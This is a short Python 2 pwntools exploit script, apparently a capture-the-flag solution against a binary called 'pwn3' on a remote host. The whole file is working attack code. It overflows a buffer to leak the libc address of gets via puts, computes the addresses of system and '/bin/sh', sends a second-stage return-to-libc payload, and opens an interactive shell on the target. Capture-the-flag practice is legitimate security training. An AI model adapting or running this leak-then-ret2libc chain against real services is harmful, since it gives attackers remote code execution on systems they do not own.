#!/usr/bin/env python2
from pwn import *

local = True
local = False
HOST = "104.154.106.182"
PORT = 4567 
gets_offset = 0x064e60
system_offset = 0x040310
binsh_offset = 0x162d4c
elf = ELF("./pwn3")
if local:
    p = process("./pwn3")
else:
    p = remote(HOST,PORT)
padding = "A"*0x8c
puts = elf.plt["puts"]
main = elf.symbols["main"]
payload = padding
payload += p32(puts)
payload += p32(main)
payload += p32(elf.got["gets"])
open("payload","wb").write(payload)
print p.recvuntil("Now give me some sweet desert: \n")
p.sendline(payload)
gets = u32(p.recv(4))
libc_base_address = gets - gets_offset
system = libc_base_address + system_offset
binsh = libc_base_address + binsh_offset
print "gets is present at: {}".format(hex(gets))
print "system is at {}".format(hex(system))
print "binsh is at {}".format(hex(binsh))
print "Sending second stage..."
print p.recv()
payload2 = "A"*0x84 
payload2 += p32(system)
payload2 += p32(0xdeadbeef)
payload2 += p32(binsh)
p.sendline(payload2)
p.interactive()
